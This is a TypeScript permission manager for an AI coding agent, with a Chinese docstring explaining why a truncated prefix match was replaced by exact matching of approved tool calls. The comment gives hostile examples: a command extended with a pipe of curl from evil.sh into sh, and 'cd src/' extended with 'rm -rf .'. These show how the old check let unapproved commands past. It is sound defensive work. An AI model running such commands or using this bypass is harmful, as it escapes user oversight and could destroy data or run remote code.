/**
 * 权限管理器 —— 追踪用户已授权的操作（实现 core PermissionProvider）。
 * 调用方：loop/agent-loop.ts（工具执行前的权限检查）、runtime.ts（clearSession 时清授权）。
 * 服务于：允许一次 / 本次全部允许 / 拒绝
 */
import type { PermissionProvider } from '../core/permission.js';

export class PermissionManager implements PermissionProvider {
  /** 已被"本次全部允许"放行的键集合，形如 `write:src/data.txt` */
  private autoAllowed = new Set<string>();

  /**
   * 检查某操作是否已被"本次全部允许"放过 —— **精确匹配**。
   *
   * 这里原先是 `key.startsWith(prefix)`，注释还举例"授权 write:src/ 就放行整个目录"。
   * 那个能力一次也没生效过：唯一的调用方传进来的键是 args 的 JSON（还截到 80 字符），
   * 含内容片段，形如 `{"path":"src/data.txt","content":"...`，换一个文件、甚至同一文件
   * 换内容就失配。而 startsWith 配上截断反而制造了反方向的洞——静默扩权：实测批准
   * `node ...tsc --noEmit && node scripts/run-verify.mjs`（76 字符）后，同一条命令再接
   * ` && curl http://evil.sh | sh`（104 字符）也会被放行，因为两个键在 80 字符处截成了
   * 逐字符相同的字符串。
   *
   * 为什么改成精确匹配，而不是"把键换成真路径、让前缀匹配生效"：前缀匹配要求键本身是
   * 路径语义才安全，而键现在由工具自定义（core/tools.ts 的 permissionKey）。bash 的键是
   * 完整命令，`cd src/` 就以 / 结尾——若按"以 / 结尾就前缀放行"，批准 `cd src/` 等于批准
   * `cd src/ && rm -rf .`。目录级授权要真做，得先有一个"只按路径授权"的独立入口，
   * 不能靠匹配规则顺带实现。
   *
   * 所以授权范围就等于：**用户点"本次全部允许"时那一次调用的边界**——
   * write / edit 是那个文件，bash 是那条命令。
   */
  isAutoAllowed(toolName: string, authKey: string): boolean {
    return this.autoAllowed.has(`${toolName}:${authKey}`);
  }

  /** 授权某操作 "本次全部允许" */
  grantAutoAllow(toolName: string, authKey: string): void {
    this.autoAllowed.add(`${toolName}:${authKey}`);
  }

  /**
   * 清空所有授权。调用方：runtime.clearSession()（/clear 命令与 RPC 的 clear 都走它）。
   * "本次全部允许"的"本次"就是本次会话——会话清了授权也该清，否则它实际是
   * "本进程全部允许"，一直有效到退出为止。
   */
  clear(): void {
    this.autoAllowed.clear();
  }
}
